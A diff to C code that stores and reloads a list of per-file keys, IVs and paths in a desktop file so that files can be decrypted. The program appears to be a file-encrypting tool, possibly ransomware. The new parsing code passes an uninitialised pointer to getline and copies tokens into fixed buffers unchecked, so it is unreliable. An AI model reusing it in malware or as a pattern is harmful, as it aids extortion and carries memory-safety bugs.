@@ -85,9 +85,9 @@ void save_into_file_encrypted_list(List *l, char * desktop){
     while(l != NULL){
         line = malloc(strlen(l->info[0]) + strlen(l->info[1]) + strlen(l->info[2]) + 11);
         strcpy(line, l->info[0]);
-        strcat(line, "+/-");
+        strcat(line, ":");
         strcat(line, l->info[1]);
-        strcat(line, "+/-");
+        strcat(line, ":");
         strcat(line, l->info[2]);
         strcat(line, "\n");
         fwrite(line, strlen(line), 1, f);
@@ -107,36 +107,56 @@ void save_into_file_encrypted_list(List *l, char * desktop){
  * This list will be used to decrypt the files.
  * @param l -> type = List
  */
-void read_from_file_encrypted_files(List **l, char * start_path){
+void read_from_file_encrypted_files(List **l, char * desktop){
     FILE *f;
-    List temp;
     int status;
-    char *key, *iv, *path;
+    char *key, *iv, *path, *line;
+    char *token;
+    size_t len = 0;
+    ssize_t read;
+    
+    char * new_file = (char *)malloc(strlen(desktop) + 13);
+    strcpy(new_file, desktop);
+    strcat(new_file, "enc_files.gc");
+    
+    key = (char *)malloc(sizeof(char) *33);
+    iv = (char *)malloc(sizeof(char) * 17);
+    
+    
+    f = fopen(new_file, "r");
+    
+    if(f != NULL){
+        if(*l == NULL){
+            /*Still need to figure if the file is encrypted RSA1024*/
+            while ((getline(&line, &len, f)) != -1) {
 
-    char * new_file = "/home/tarcisio/Desktop/enc_files.gc";
-    //strcat(start_path, "enc_files.gc");
+                token = strtok(line, ":");
+                strcpy(key, token);
+                token = strtok(NULL, ":");
+                strcpy(iv, token);
+                token = strtok(NULL, ":");
+                path = (char *)malloc(sizeof(char) * (strlen(token) + 2));
+                strcpy(path, token);
 
-    if(*l != NULL){
-        destroy(l);
-
-    }else if(*l == NULL){
-        f = fopen(start_path, "rb");
-        if(f != NULL){
-
-            while(1){
-
-                status = fread(&temp, sizeof(List), 1, f);
-                if(status != 1){
-                    if(feof(f)){
-                        fclose(f);
-                        return;
-                    }
-                }
-                append(l, temp.info[2], temp.info[0], temp.info[1]);
+                append(l, path, key, iv);
+                memset(key, 0, strlen(key));
+                memset(iv, 0, strlen(iv));
+                free(path);
             }
 
             fclose(f);
+            free(new_file);
+            free(key);
+            free(iv);
+            free(line);
+
+            
+        }else if(*l != NULL){
+            destroy(l);
         }
+        
+    }else{
+        printf("Arquivos ainda não foram criptografados\n");
     }
 }
 
